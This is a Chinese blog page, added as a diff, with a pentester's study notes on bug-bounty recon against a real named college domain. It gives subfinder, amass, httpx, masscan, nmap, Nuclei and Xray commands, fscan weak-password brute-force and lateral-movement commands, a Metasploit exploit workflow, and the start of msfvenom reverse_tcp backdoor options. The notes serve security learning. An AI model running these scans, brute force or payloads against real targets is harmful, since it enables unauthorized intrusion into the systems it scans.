@@ -1,0 +1,871 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/mad.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="i4G5d">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="为了面试，随便选一个厂商，好好过一遍SRC挖掘过程这次随便选了个学校：台州职业技术学院 1.域名搜集爱企查&#x2F;企查查&#x2F;天眼查&#x2F;小蓝本先搜索台州职业技术学院搜集域名（网站备案）tzvtc.edu.cntzvtc.com习惯放到一个文件里 2.子域名收集12345678910111213141516subfinder -d tzvtc.edu.cn -o edu_sub.t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SRC2">
+<meta property="og:url" content="https://i4g5d.github.io/2025/11/23/SRC2/index.html">
+<meta property="og:site_name" content="i4G5d-Blog">
+<meta property="og:description" content="为了面试，随便选一个厂商，好好过一遍SRC挖掘过程这次随便选了个学校：台州职业技术学院 1.域名搜集爱企查&#x2F;企查查&#x2F;天眼查&#x2F;小蓝本先搜索台州职业技术学院搜集域名（网站备案）tzvtc.edu.cntzvtc.com习惯放到一个文件里 2.子域名收集12345678910111213141516subfinder -d tzvtc.edu.cn -o edu_sub.t">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212246184.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212310794.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212325943.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212353623.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212358599.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212417046.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212430545.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212438713.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212451182.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212504504.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212511344.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212546429.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212556608.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212612496.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212619856.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212626742.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212634517.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212645688.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212655433.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212705712.png">
+<meta property="article:published_time" content="2025-11-23T13:19:05.000Z">
+<meta property="article:modified_time" content="2025-11-23T13:28:09.553Z">
+<meta property="article:author" content="i4G5d">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i4g5d.github.io/2025/11/23/SRC2/image-20251123212246184.png">
+  
+  
+  
+  <title>SRC2 - i4G5d-Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i4g5d.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":4},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>i4G5d</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SRC2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-23 21:19" pubdate>
+          2025年11月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          63 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SRC2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>为了面试，随便选一个厂商，好好过一遍SRC挖掘过程<br>这次随便选了个学校：台州职业技术学院</p>
+<h2 id="1-域名搜集"><a href="#1-域名搜集" class="headerlink" title="1.域名搜集"></a>1.域名搜集</h2><p>爱企查&#x2F;企查查&#x2F;天眼查&#x2F;小蓝本先搜索<code>台州职业技术学院</code>搜集域名（网站备案）<br>tzvtc.edu.cn<br>tzvtc.com<br>习惯放到一个文件里</p>
+<h2 id="2-子域名收集"><a href="#2-子域名收集" class="headerlink" title="2.子域名收集"></a>2.子域名收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">subfinder -d tzvtc.edu.cn -o edu_sub.txt<br>subfinder -dL domains.txt -all  -o subfinder_results.txt<br><br><br>.\amass.exe enum -passive -d tzvtc.edu.cn -o edu_amass.txt<br>.\amass.exe enum -active -brute (-src -ip) -d tzvtc.edu.cn -o active.txt<br>.\amass.exe enum -active -brute -w <span class="hljs-string">&quot;\subdomains-top1million-110000.txt&quot;</span> -min-for-recursive 2 -<span class="hljs-built_in">df</span> <span class="hljs-string">&quot;ZYD.txt&quot;</span> -o amass_all.txt  <br><br>conda activate venv<br>python oneforall.py --target tzvtc.edu.cn run <br>python oneforall.py --targets ./domains.txt run(--mode passive run)<br>python oneforall.py --targets-file <span class="hljs-string">&quot;您的域名文件.txt&quot;</span> --plugin all --<span class="hljs-built_in">fmt</span> csv run```<br>将文件集合，结合，去重<br>​```shell<br><span class="hljs-built_in">type</span> *.txt &gt; all.txt<br>Get-Content all.txt | Sort-Object | Get-Unique &gt; uniq.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-子域名验活和转ip"><a href="#3-子域名验活和转ip" class="headerlink" title="3.子域名验活和转ip"></a>3.子域名验活和转ip</h2><h3 id="HTTPX"><a href="#HTTPX" class="headerlink" title="HTTPX"></a>HTTPX</h3><p>目前我发现最主要用处，提取能真正访问的域名，能转ip，能探测指纹信息和标题</p>
+<h4 id="子域名验活"><a href="#子域名验活" class="headerlink" title="子域名验活"></a>子域名验活</h4><p>方便手动浏览测试逻辑漏洞（web服务）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\httpx -l sub.txt -title -sc -td -probe -cdn -nf -o out.txt<br>-title: 抓取页面标题。<br>-sc: 抓取状态码 (Status Code)。(cl)<br>-td: 抓取技术栈信息。<br>-probe: 探测 $HTTP$ 和 $HTTPS$ 端口，自动尝试默认端口 (80/443)。<br>-cdn: 标记是否使用了CDN。<br>-nf: 不输出404/403等非活跃状态码的域名，只输出活跃的。<br>-mc: 只输出的状态码<br>-follow-redirects 跟随跳转<br>-no-color   无颜色适合保存<br></code></pre></td></tr></table></figure>
+<p>简单留活：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\httpx.exe -l <span class="hljs-string">&quot;D:\Htool\SRC\Info-Gather\alive_IP\ZYD\uniq.txt&quot;</span> -nf -o alive.txt<br></code></pre></td></tr></table></figure>
+<p><img src="/2025/11/23/SRC2/image-20251123212246184.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="转IP"><a href="#转IP" class="headerlink" title="转IP"></a>转IP</h4><p>这是主要用于对接端口扫描的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">httpx.exe -l &quot;D:\Htool\SRC\Info-Gather\alive_IP\ZYD\uniq.txt&quot; -ip ip.txt<br></code></pre></td></tr></table></figure>
+
+<p>python脚本提取IP并去重</p>
+<h2 id="4-端口扫描"><a href="#4-端口扫描" class="headerlink" title="4.端口扫描"></a>4.端口扫描</h2><p>naabu暂未使用<br>端口扫描的核心逻辑是<strong>向目标 IP 的指定端口发送探测数据包，根据响应结果判断端口是否开放</strong></p>
+<ul>
+<li>开放端口：会回复 “同意连接”（如 TCP SYN+ACK 包）；</li>
+<li>关闭端口：会回复 “拒绝连接”（如 TCP RST 包）；</li>
+<li>过滤端口（防火墙拦截）：无响应或回复 “不可达”。<br>端口扫描要做的就是</li>
+<li>找存活（攻击面） 开放端口的 <strong>IP 地址</strong> 和 <strong>端口号</strong>。</li>
+<li>找信息（漏洞暴露） 端口上运行的 <strong>服务名称</strong> 和 <strong>版本号</strong>。</li>
+<li>服务器响应头中的 <strong>WAF</strong>、<strong>CDN</strong> 或 <strong>操作系统</strong> 指纹。</li>
+</ul>
+<h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><p>用kali可操作<br>(高速大范围筛选)过滤噪音</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> --top-ports <span class="hljs-number">100</span> -iL ip2.txt --rate=<span class="hljs-number">2000</span> -oX masscan.xml -e eth0<br><span class="hljs-attribute">masscan</span> -p80,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8443</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">7001</span> --rate=<span class="hljs-number">2000</span> -iL ips.txt -oX masscan.xml<br><br></code></pre></td></tr></table></figure>
+<p>导出IP+端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描 ip2.txt 中的 IP，全端口（1-65535），速率 50000 端口/秒</span><br><span class="hljs-comment"># 输出格式：IP:端口（便于 nmap 读取）</span><br>masscan -iL ip2.txt --ports 1-65535 --rate 50000 -oJ - | jq -r <span class="hljs-string">&#x27;.ip + &quot;:&quot; + (.ports[0].port | tostring)&#x27;</span> &gt; open_ports.txt<br>或自制脚本<br><span class="hljs-comment"># 提取所有 host 标签中的 addr 属性，然后去重并排序</span><br>grep -oP <span class="hljs-string">&#x27;(?&lt;=addr=&quot;)[0-9\.]+&#x27;</span> masscan.xml | <span class="hljs-built_in">sort</span> -u &gt; ip_only.txt<br><span class="hljs-comment"># 使用 awk 打印 IP 和 Port，并用 : 连接，最后去重</span><br>awk -F<span class="hljs-string">&#x27;[&lt;&gt;]&#x27;</span> <span class="hljs-string">&#x27;/&lt;host/&#123;ip=$8&#125; /portid/&#123;print ip &quot;:&quot; $21&#125;&#x27;</span> masscan.xml | <span class="hljs-built_in">sort</span> -u &gt; ip_port.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>（精准扫描探测）提取价值</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nmap -sV -Pn -iL masscan_open_ip_port<span class="hljs-selector-class">.txt</span> -oN nmap_result<span class="hljs-selector-class">.txt</span><br>nmap -sS -Pn -iL masscan_ip_only<span class="hljs-selector-class">.txt</span> -<span class="hljs-attribute">top</span>-ports <span class="hljs-number">1000</span> -oA nmap_full_port<br><br></code></pre></td></tr></table></figure>
+<p><img src="/2025/11/23/SRC2/image-20251123212310794.png" srcset="/img/loading.gif" lazyload></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-sT</td>
+<td>tcp扫描建立完整连接</td>
+</tr>
+<tr>
+<td>-sS</td>
+<td>syn半连接，两次握手，最好用</td>
+</tr>
+<tr>
+<td>-sF</td>
+<td>绕WAF首选</td>
+</tr>
+<tr>
+<td>-sU</td>
+<td>udp连接 很慢 只看开没开端口</td>
+</tr>
+<tr>
+<td>-sV</td>
+<td>识别服务</td>
+</tr>
+<tr>
+<td>-A</td>
+<td>对目标主机实施全面扫描，结果中包括各种类型的信息</td>
+</tr>
+<tr>
+<td>Pn</td>
+<td>跳过ping，提高扫描成功率</td>
+</tr>
+<tr>
+<td>iL</td>
+<td>从列表读取IP</td>
+</tr>
+<tr>
+<td>–script&#x3D;vuln&#x2F;brute</td>
+<td>漏洞检测&#x2F;爆破</td>
+</tr>
+<tr>
+<td>sC</td>
+<td>默认脚本</td>
+</tr>
+<tr>
+<td>oN</td>
+<td>纯文本保存</td>
+</tr>
+<tr>
+<td>oX</td>
+<td>对接漏扫，xml</td>
+</tr>
+<tr>
+<td>oG <filename> | grep <pattern></pattern></filename></td>
+<td>批量提取开放端口、筛选存活主机</td>
+</tr>
+<tr>
+<td>oA</td>
+<td>所有方式输出</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>扫网段 发现主机</td>
+</tr>
+<tr>
+<td>-g&#x2F;-f</td>
+<td>端口指定和分段数据包</td>
+</tr>
+<tr>
+<td>获得IP:port 服务名称 + 版本 + 是否是 web 服务</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h3><ul>
+<li><p><strong>非 Web 服务：</strong> 将开放了非 80&#x2F;443 端口的 IP 地址（如 <code>1.1.1.1:3306</code>）直接输入给 <strong>网络&#x2F;系统级漏扫工具</strong>（如 Nessus）。</p>
+</li>
+<li><p><strong>Web 服务：</strong> 将所有开放 80&#x2F;443 端口的 IP 地址，<strong>以及</strong>通过 HTTPX 验活的 <strong>URL 列表</strong>，输入给 <strong>Web 应用漏扫工具</strong>（如 Awvs, Xray）。这些工具内部的漏洞库会根据 Nmap 提供的版本指纹，自动匹配是否存在可利用的 CVE。</p>
+</li>
+</ul>
+<h2 id="5-漏扫"><a href="#5-漏扫" class="headerlink" title="5. 漏扫"></a>5. 漏扫</h2><p>漏扫的重点：服务软件版本的漏洞，比如：<br>扫出web指纹 比如<code>DBAppWAF/2.1.1</code> 这样的版本信息后，手动查<code>DBAppWAF/2.1.1</code>漏洞或者将 IP&#x2F;端口输入给 <strong>Nuclei</strong></p>
+<h3 id="Nuclei（模板库）"><a href="#Nuclei（模板库）" class="headerlink" title="Nuclei（模板库）"></a>Nuclei（模板库）</h3><p>模板化快速漏洞扫描器，它本身不具备漏洞检测能力，但靠模板。<br>常用标签<br><img src="/2025/11/23/SRC2/image-20251123212325943.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 假设您的 IP:Port 列表已保存为 ip_port_80_443.txt</span><br><span class="hljs-comment"># 扫描子域名 就是一次信息搜集，扫出wwaf和内网ip</span><br><span class="hljs-comment"># 扫描完整网址才是漏扫</span><br>nuclei -l .\url_ipp.txt -o nuclei_result.txt<br><span class="hljs-comment"># 运行 Nuclei 扫描，主要关注 Web 应用程序的配置、信息泄露和高危漏洞</span><br>nuclei -l ip_port_80_443.txt -tags web,cve,config,info -severity high,critical -o nuclei_result.txt<br><span class="hljs-comment"># 如果您想针对特定的 WAF 指纹进行检查</span><br><span class="hljs-comment"># 例如，搜索与 WAF 相关的模板并运行</span><br>nuclei -l ip_port_80_443.txt -tags waf -o nuclei_waf_scan.txt<br><span class="hljs-comment"># -rl 50: 限制每秒请求数，避免对目标造成过大压力（重要，必须设置） </span><br><span class="hljs-comment"># -retries 2: 增加重试次数，提高扫描准确率</span><br><span class="hljs-comment"># -tags  **只运行** 那些包含你指定标签的模板，</span><br></code></pre></td></tr></table></figure>
+<p><strong>Nuclei 的优势：</strong> 速度快，模板库更新及时，对已知的服务漏洞覆盖率高。</p>
+<h3 id="Xray（偏向web应用扫描）"><a href="#Xray（偏向web应用扫描）" class="headerlink" title="Xray（偏向web应用扫描）"></a>Xray（偏向web应用扫描）</h3><p><a target="_blank" rel="noopener" href="https://blog.hackall.cn/pentest/790.html">一文掌握Xray用法</a><br>Xray 是一个优秀的被动&#x2F;主动<strong>动态应用安全测试 (DAST)</strong> 工具，非常擅长在请求和响应中寻找传统 Web 漏洞，如 SQL 注入、XSS、命令执行等。</p>
+<ol>
+<li>被动扫描<br> Xray 监听一个代理，把你的流量全部扫描漏洞。<br> Browser → Burp → Xray → Website<br> 边手测边自动漏扫，全自动加半自动结合</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xray.exe webscan --listen 127.0.0.1:7777 --html-output report.html  //可与burp联动<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>主动扫描<br> Xray 自己发送请求做漏洞探测</li>
+</ol>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">xray.exe webscan <span class="hljs-params">--url</span> https:<span class="hljs-string">//target.com</span> <span class="hljs-params">--poc</span> pocs/ <span class="hljs-params">--html-output</span> result.html<br>xray.exe webscan <span class="hljs-params">--url-file</span> urls.txt <span class="hljs-params">--html-output</span> report.html<br>- 使用`x`命令：`xray_windows_amd64.exe x -t 192.168.0.1/16`，x命令默认启用了所有的插件，包括存活探测、端口扫描、指纹识别等。<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="fscan（内网扫描利器）"><a href="#fscan（内网扫描利器）" class="headerlink" title="fscan（内网扫描利器）"></a>fscan（内网扫描利器）</h3><p>横向打点工具<br><img src="/2025/11/23/SRC2/image-20251123212353623.png" srcset="/img/loading.gif" lazyload></p>
+<p>内网专用私有网段：<br><img src="/2025/11/23/SRC2/image-20251123212358599.png" srcset="/img/loading.gif" lazyload></p>
+<p>Fscan不是扫漏洞，但能扫内网大段IP，<br>扫存货，C 段扫描，弱口令探测（SSH、RDP、MySQL、Redis…），SMB 扫漏洞，扫常见漏洞</p>
+<ol>
+<li><p>在内网 横向移动</p>
+<ul>
+<li>C 段扫描 + 端口挂马指纹识别<code>fscan -h 10.10.11.0/24</code></li>
+<li>弱口令批量测试 <code>fscan -pwd password.txt -h 10.10.11.0/24</code></li>
+</ul>
+</li>
+<li><p>在外网 不适合 噪声大</p>
+<ul>
+<li>探测存活主机   <code>fscan -hf ip.txt</code></li>
+<li>端口扫描</li>
+</ul>
+</li>
+</ol>
+<p>常用命令</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">fscan -h <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">24</span>  默认使用所有模块（主机探测，端口探测，漏洞探测，弱口令，资产，指纹）<br>fscan -h <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">16</span> B段规模扫描<br>fscan -hf ip<span class="hljs-selector-class">.txt</span> 以文件形式导入<br>fscan<span class="hljs-selector-class">.exe</span> -h <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">22</span> -user admin -pwd pass<span class="hljs-selector-class">.txt</span> SSH爆破<br>-<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span>-<span class="hljs-number">300</span> 限定端口<br>-np  只扫web和弱口令<br>-m smb      SMB 弱口令爆破<br>-o result<span class="hljs-selector-class">.txt</span>   导出<br><span class="hljs-attr">--nobrute</span>禁用弱口令 避免噪声<br><span class="hljs-attr">--novuln</span> 禁漏扫<br></code></pre></td></tr></table></figure>
+<p>SMB是Windows 用来共享文件 &#x2F; 打印机 &#x2F; 管理服务的协议  445</p>
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>在搜集到指纹信息或存在后门时尝试使用MSF渗透<br>Metasploit Framework（MSF）是一款开源渗透框架，该框架分为内核层，模块层，接口层</p>
+<p>模块层是 MSF 最核心的部分，所有渗透测试操作都通过调用模块实现。<br><img src="/2025/11/23/SRC2/image-20251123212417046.png" srcset="/img/loading.gif" lazyload></p>
+<p>接口层用于调用这些模块，提供多种与框架交互的方式<br><code>msfconsole</code>:  这是最常用、功能最全的命令行接口 (CLI)。<br><strong><code>msfvenom</code></strong>: 一个独立的工具，用于生成和编码 Payload。       （附属工具）<br><code>Armitage</code>: 可视化操作 MSF，拖放模块即可执行，适合新手入门<br><code>Cobalt Strike</code>: 基于 MSF 内核的商业化扩展（非官方），支持团队协作、高级后渗透(企业级)      （附属工具）</p>
+<h4 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h4><p><img src="/2025/11/23/SRC2/image-20251123212430545.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>search  查找模块 <code>msf &gt; search apache</code></li>
+<li>use 选择要使用的模块 <code>msf &gt; use auxiliary/scanner/smb/smb_version</code></li>
+<li>show options 宣誓配置选项<code>msf &gt; show options</code></li>
+<li>set 设置选项 <code>set RHOSTS 192.168.0.100``set lHOSTS 192.168.0.100</code></li>
+<li>exploit 执行当前攻击 <code>msf &gt; exploit</code><br>一个完整流程往往是这样的<br>msf自带nmap扫端口 扫指纹 但事实上用其他工具扫</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">db_nmap -sV -p 80,443,4444 10.150.126.164<br><br>msf6 &gt; hosts  <span class="hljs-comment"># 查看目标主机</span><br>msf6 &gt; services  <span class="hljs-comment"># 查看开放端口和服务</span><br><br>更具获得的指纹信息 serch指纹 看看有没有可利用模块并use<br>随后进入模块 shoW options show payloads<br><span class="hljs-built_in">set</span> 好信息 check是否存在漏洞 存在的话直接run或者exploit<br><br>成功获取会话后 进行会话管理<br>sessions -l<br>sessions -i 1<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/23/SRC2/image-20251123212438713.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4><p>用于各种恶意软件和后门</p>
+<ul>
+<li><p>-p 指定使用payload  <code>-p windows/meterpreter/reverse_tcp</code> </p>
+<ul>
+<li>{[OS]&#x2F;[Architecture]&#x2F;[Payload Type]&#x2F;[Connection Method]}</li>
